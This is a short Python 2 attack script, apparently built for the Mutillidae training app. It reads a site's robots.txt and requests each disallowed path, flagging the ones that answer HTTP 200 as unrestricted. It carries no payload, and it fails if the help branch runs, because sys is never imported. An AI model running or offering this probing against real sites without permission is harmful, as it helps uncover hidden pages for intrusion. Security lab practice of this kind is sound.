#!/usr/bin/env python

import mechanize, urllib2
from bs4 import BeautifulSoup
import time
import optparse

class FailureToRestrictURLAccessAttack():

	def __init__(self, url):
		self.url = url		
		try:	
			useragent = "Mozilla/5.0 (iPad; CPU OS 6_0 like Mac OS X) AppleWebKit/536.26 (KHTML, like Gecko) Version/6.0 Mobile/10A5355d Safari/8536.25"
			self.browser = mechanize.Browser()
			self.browser.set_handle_robots(False)
			self.browser.add_headers = [("User-agent",useragent)]
		except Exception, e:
			print " [!] Browser object creation error:", e

	def __wait(self):
		time.sleep(2)

	def close(self):
		self.browser.close()
		
	def attack(self):
		if self.browser == None:
			return
		try:	
			robots = self.url+"/robots.txt"
			print " [-] Openning 'robots.txt' at '%s'\n"%robots
			self.browser.open(robots, timeout=4)

			entries = self.browser.response().read().split("\n")
			entries = entries[1:]
			dirs = [entry.split()[-1][1:] for entry in entries]

			print " [*] Entries in 'robots.txt':"
			for dir in dirs:
				print "\t[+] %s"%dir
			
			print "\n [-] Checking entries for unrestricted access..."
			for dir in dirs:
				try:				
					self.browser.open(self.url+dir, timeout=4)
					if self.browser.response().code == 200:
						print "\t[!] Url '%s' is accessible"%(self.url+dir)
				except urllib2.HTTPError:
					continue
		except Exception, e:
			print " [!] Attack was not successfull, error:", e

def main():
	parser = optparse.OptionParser("Usage: %prog -u <url> or %prog --url=<url>")
	parser.add_option("-u", "--url", dest="url", help="mutillidae home")
	options, args = parser.parse_args()
	if options.url == None:
		parser.print_help()
		sys.exit(0)
	
	attacker = FailureToRestrictURLAccessAttack(options.url)
	attacker.attack()
	attacker.close()

if __name__ == "__main__":
	main()		
